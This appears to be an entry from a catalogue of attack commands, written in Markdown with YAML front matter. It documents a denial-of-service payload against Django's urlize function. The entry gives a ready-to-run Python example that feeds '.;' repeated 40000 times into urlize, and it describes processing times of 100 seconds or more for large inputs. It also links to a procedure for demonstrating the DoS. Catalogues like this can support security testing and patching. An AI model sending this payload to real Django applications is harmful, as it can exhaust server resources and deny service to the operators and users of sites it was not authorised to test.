---
id: cmd-uuid-7
data: django.utils.html.urlize(PAYLOAD)
tags:
  - vulnerable
  - urlize
  - dos
type: command
output: null
executor: python
platforms:
  - Python
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:02.915Z'
verified: false
validated: true
submitted: true
---
---

# execute-urlize

## Command

```python
django.utils.html.urlize(PAYLOAD)
```

## Description

Executes the urlize function on the PAYLOAD string, which converts URLs to links but slows exponentially on repeated '.;' inputs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| PAYLOAD | Input string to process | Yes |

## Examples

### Basic Usage

```python
PAYLOAD = ".;" * 40000
django.utils.html.urlize(PAYLOAD)
```

## Expected Output

HTML-escaped string with potential links; but execution time increases with payload size (e.g., 0.5s for small, 100s+ for large).

## Related

- [[Related Procedure|procedures/Demonstrate-DoS-in-Django-urlize-with-Repeated-Payloads]]
